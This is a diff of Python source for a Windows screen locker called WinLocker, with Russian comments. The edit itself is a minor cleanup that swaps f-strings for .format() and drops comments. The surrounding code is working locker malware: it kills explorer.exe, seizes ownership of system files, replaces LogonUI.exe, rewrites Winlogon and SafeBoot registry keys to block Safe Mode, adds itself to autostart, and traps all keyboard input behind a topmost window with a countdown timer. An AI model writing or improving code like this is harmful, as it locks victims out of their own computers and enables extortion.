@@ -49,7 +49,6 @@ def unblock_keys():
         pass
 
 def kill_explorer():
-    """Убивает explorer.exe"""
     try:
         subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -59,7 +58,6 @@ def kill_explorer():
         return False
 
 def start_explorer():
-    """Запускает explorer.exe"""
     try:
         subprocess.Popen(["explorer.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
         return True
@@ -117,13 +115,13 @@ def enable_cmd_powershell():
         pass
 
 def force_take_ownership(path):
-    """Принудительное получение прав на файл"""
     try:
         subprocess.run(["net", "stop", "TrustedInstaller"], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         time.sleep(2)
         
-        os.system(f'attrib -r -s -h "{path}"')
+        # F-строка заменена на .format()
+        os.system('attrib -r -s -h "{}"'.format(path))
         
         subprocess.run(["takeown", "/f", path], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -136,7 +134,6 @@ def force_take_ownership(path):
         return False
 
 def hijack_logonui_enhanced():
-    """Усиленная замена LogonUI с гарантией"""
     try:
         logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
         backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
@@ -156,7 +153,8 @@ def hijack_logonui_enhanced():
                 pass
             os.rename(temp_path, logonui_path)
         
-        os.system(f'attrib +r +s +h "{logonui_path}"')
+        # F-строка заменена на .format()
+        os.system('attrib +r +s +h "{}"'.format(logonui_path))
         
         subprocess.run(
             ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
@@ -186,7 +184,7 @@ def hijack_logonui_enhanced():
         return True
         
     except Exception as e:
-        print(f"[-] Ошибка замены LogonUI: {e}")
+        print("[-] Ошибка замены LogonUI: {}".format(e))
         return False
 
 def restore_logonui():
@@ -204,7 +202,6 @@ def restore_logonui():
         pass
 
 def block_safe_mode_enhanced():
-    """Усиленная блокировка всех вариантов безопасного режима"""
     try:
         subprocess.run(
             ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
@@ -254,7 +251,7 @@ def block_safe_mode_enhanced():
         return True
         
     except Exception as e:
-        print(f"[-] Ошибка блокировки Safe Mode: {e}")
+        print("[-] Ошибка блокировки Safe Mode: {}".format(e))
         return False
 
 def restore_safe_mode():
@@ -278,7 +275,6 @@ def restore_safe_mode():
         pass
 
 def add_autostart_enhanced():
-    """Усиленная автозагрузка"""
     try:
         subprocess.run(
             ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -384,7 +380,6 @@ class WinLocker:
         hijack_logonui_enhanced()
         add_autostart_enhanced()
         
-        # Убиваем explorer.exe
         kill_explorer()
         
         block_keys()
@@ -400,14 +395,13 @@ class WinLocker:
         self.root.focus_force()
         self.root.attributes('-topmost', True)
         
-        # ИСПРАВЛЕНА ОШИБКА "Windows" - заменено на "Super_L" и "Super_R"
         self.root.bind_all("<Control-Key>", lambda e: "break")
         self.root.bind_all("<Alt-Key>", lambda e: "break")
         self.root.bind_all("<Escape>", lambda e: "break")
         self.root.bind_all("<F1>", lambda e: "break")
         self.root.bind_all("<F4>", lambda e: "break")
-        self.root.bind_all("<Super_L>", lambda e: "break")  # Левая клавиша Windows
-        self.root.bind_all("<Super_R>", lambda e: "break")  # Правая клавиша Windows
+        self.root.bind_all("<Super_L>", lambda e: "break")
+        self.root.bind_all("<Super_R>", lambda e: "break")
         self.root.bind_all("<Key>", lambda e: "break")
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
         
@@ -571,7 +565,6 @@ class WinLocker:
         restore_logonui()
         remove_autostart()
         
-        # Запускаем explorer.exe обратно
         start_explorer()
         
         self.root.destroy()
@@ -588,7 +581,8 @@ class WinLocker:
         hours = self.remaining // 3600
         minutes = (self.remaining % 3600) // 60
         seconds = self.remaining % 60
-        self.timer_display.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
+        # F-строка заменена на .format()
+        self.timer_display.config(text="{:02d}:{:02d}:{:02d}".format(hours, minutes, seconds))
         self.remaining -= 1
         self.timer_id = self.root.after(1000, self.update_timer)
 
